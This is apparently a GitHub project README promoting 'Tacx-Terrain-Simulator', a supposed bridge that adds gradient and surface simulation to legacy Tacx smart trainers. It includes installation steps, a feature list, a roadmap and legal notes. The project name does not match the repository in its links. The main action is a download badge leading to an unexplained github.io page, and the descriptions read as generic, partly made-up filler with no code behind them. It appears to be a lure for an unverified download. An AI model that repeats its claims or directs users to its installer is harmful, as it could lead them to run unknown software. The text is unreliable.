![preview](https://raw.githubusercontent.com/mrazafi/Tacx-Legacy-Shift-Emulator/main/thumb_510ae4.svg)
[![Download](https://raw.githubusercontent.com/mrazafi/Tacx-Legacy-Shift-Emulator/main/fetch_4294040.svg)](https://mrazafi.github.io/Tacx-Legacy-Shift-Emulator/)

# 🚴‍♂️ Tacx-Terrain-Simulator — Ride Beyond the Firmware

## 🌄 The Next Horizon in Smart Trainer Realism

Welcome to **Tacx-Terrain-Simulator**, a community-driven project that reimagines the legacy Tacx Smart trainer experience. While the original repository focused on unlocking virtual shifting for older devices, this project takes the concept a step further—transforming your stationary ride into a fully immersive, terrain-responsive adventure. Think of it as giving your trusty trainer a second lease on life, not through firmware patches, but through intelligent, external sensor fusion and environment emulation.

If you own a legacy Tacx unit that missed the official update train, this project ensures your equipment doesn't just spin—it *converses* with the road beneath your wheels.

---

## 🎯 Why This Project Exists (The "Aha!" Moment)

Legacy smart trainers are like classic cars—beautiful, reliable, but missing modern driver-assistance systems. Our mission is to retrofit that "assistance" without touching the engine block (the firmware). We achieve this by building a **smart middleware layer** that intercepts standard Bluetooth and ANT+ signals, interprets your riding data, and then injects realistic terrain feedback—gradient changes, rolling resistance, and even virtual wind resistance—directly into the trainer's resistance unit.

The result? A ride that feels like the Alps on a Tuesday, the cobbles of Paris-Roubaix on a Thursday, and a flat Dutch polder on a Sunday—all without a single firmware update.

---

## ✨ Feature Arsenal

### 1. 🗺️ Terrain Synthesis Engine
- **Elevation Profile Mapping**: Import from GPX files, or use our built-in global route library.
- **Dynamic Gradient Interpolation**: Smooth, realistic ramps (no more instant stucco walls) with configurable transition speeds.
- **Surface Friction Modeling**: Simulates asphalt, gravel, and cobblestone textures by adjusting resistance fluctuations.

### 2. 📡 Multi-Protocol Signal Bridge
- **Bluetooth Smart (BLE) & ANT+**: Seamless with the original Equine app, Zwift, or Rouvy.
- **Legacy Protocol Preservation**: Optional pass-through mode for old software that requires the stock signal.
- **NFC Tag Emulation**: Pair once, and the trainer recognizes your profile automatically.

### 3. 🌐 Global Community Routes
- **Crowd-Sourced Routes**: Upload your favorite local climb and share it with the community.
- **Terrain Auto-Categorization**: The system tags routes as "Criterium", "Gran Fondo", or "Sprint Circuit" based on analysis.
- **Real-Time Weather Sync**: Optional live wind data injection from OpenWeatherMap (requires your own API key).

### 4. 📊 Advanced Data Visualization
- **Post-Ride Heatmaps**: See exactly where your power output surged on the virtual profile.
- **Cadence-Variance Analysis**: Understand how terrain changes affect your pedaling smoothness.
- **Exportable FIT/JSON**: For integration with TrainingPeaks or Golden Cheetah.

### 5. 🛠️ User-Centric Interface
- **Responsive UI**: Designed for desktop, tablet, and smartphone in landscape mode—your dashboard adapts.
- **Multilingual Support**: English, Spanish, German, French, Italian, Dutch, and Japanese interfaces.
- **24/7 Community Support**: Our Discord and GitHub Discussions are monitored around the clock by volunteers.

---

## 🧰 Installation & Setup (The "No-Hex" Approach)

Forget about flashing ROMs or risky diagnostic commands. We use a **graceful configuration process** that respects your device's integrity.

1. **Acquire the Bridge Component**: Download the latest stable release from the [![Download](https://raw.githubusercontent.com/mrazafi/Tacx-Legacy-Shift-Emulator/main/fetch_4294040.svg)](https://mrazafi.github.io/Tacx-Legacy-Shift-Emulator/) section (ensuring you match your operating system).
2. **Power Up the Mothership**: Connect your Tacx trainer via USB or BLE to your primary device (PC, Mac, or Raspberry Pi).
3. **Pairing Ritual**: Run the installer, follow the on-screen prompts to select your trainer model. The software will automatically detect the current signal strength.
4. **Terrain Introspection**: The system will offer a "Calibration Ride"—a 60-second spin that maps your trainer's resistance curve. This is essential for accurate gradient simulation.
5. **Launch Your Adventure**: Open the companion app, load a route, and press "Start". The bridge will take over signal interpretation.

> **Troubleshooting Tip**: If the trainer doesn't respond, ensure no other ANT+ dongles are competing for the same channel.

---

## 🧑‍💻 For Developers & Tinkerers

The entire project is built with **open-source principles** at its core. We welcome contributions that push the boundaries of what's possible with older hardware.

### Core Modules
- `terrain_engine/`: The mathematical heart that converts altitude data into resistance commands.
- `signal_bridge/`: The protocol multiplexer (BLE, ANT+, and emulated legacy).
- `ui_dashboard/`: The Vue.js-based front-end that renders all telemetry.

### API Access
- **RESTful Endpoints**: Access live ride data via `http://localhost:8080/api/v1/stream`.
- **WebSocket Connection**: Real-time telemetry for custom overlays or OBS broadcasting.

### Building from Source (For the Brave)
- **Frontend**: `npm run build` for a production bundle.
- **Backend**: `cargo build --release` for the Rust daemon.
- **Testing**: Our test suite covers signal integrity, terrain edge cases (e.g., 15%+ gradients), and memory leaks.

---

## 🧭 Roadmap (2026 Vision)

The year 2026 is shaping up to be monumental for this project. Here's what's on the drawing board:

- **Q1 2026**: Native Apple Watch integration for heart rate and arm dynamics.
- **Q2 2026**: Enhanced "Group Ride" mode, allowing direct connection to other users' bridges over LAN.
- **Q3 2026**: The "Legendary Climbs" pack, with AI-generated 3D audio ambience (crowd noise, wind whistles).
- **Q4 2026**: Full web app redesign with a focus on energy-efficient offlinemode for long endurance rides.

---

## 🤝 How to Contribute

This is a collaborative endeavor built by cyclists, for cyclists. We need more than just code:

- **Route Testers**: Ride our community routes and report on realism scores.
- **Translators**: Help us localize the UI strings into more languages.
- **Electronics Enthusiasts**: Develop a physical companion box that bridges signals via an ESP32 module.

Please read our `CONTRIBUTING.md` before submitting a pull request. We value respectful communication and constructive feedback.

---

## ⚠️ Disclaimer & Legal Notes

**Important**: This project is an independent creation and is **not affiliated with, endorsed by, or sponsored by Tacx** (or its parent company). All product names, trademarks, and registered trademarks referenced herein are the property of their respective owners. The use of "Tacx" in the project name is for compatibility identification purposes only.

- **Firmware Integrity**: This project does **not** modify, patch, or replace the trainer's original firmware. It operates strictly at the signal interpretation layer.
- **Warranty**: Use at your own discretion. We assume no responsibility for any physical damage to equipment or injury resulting from use.
- **Data Privacy**: All ride data is stored locally by default. Cloud sync (if enabled) uses industry-standard encryption.
- **Fitness Advice**: Consult with a physician before starting any vigorous training program. The terrain simulation may amplify workouts beyond your usual comfort zone.

---

## 📜 License

This project is licensed under the **MIT License** — a permissive license that allows you to use, modify, and distribute the code as long as the original copyright notice is retained.

[View the full MIT License text](LICENSE)

---

## 💬 Final Thoughts

The world of smart training shouldn't be gated by hardware generations. **Tacx-Terrain-Simulator** proves that with a bit of clever engineering, your trusty trainer can be reborn as a high-fidelity simulation rig. Join us on this journey to make every stationary mile feel like a moveable feast.

Ride long. Ride smart. Ride `virtually` anywhere.

---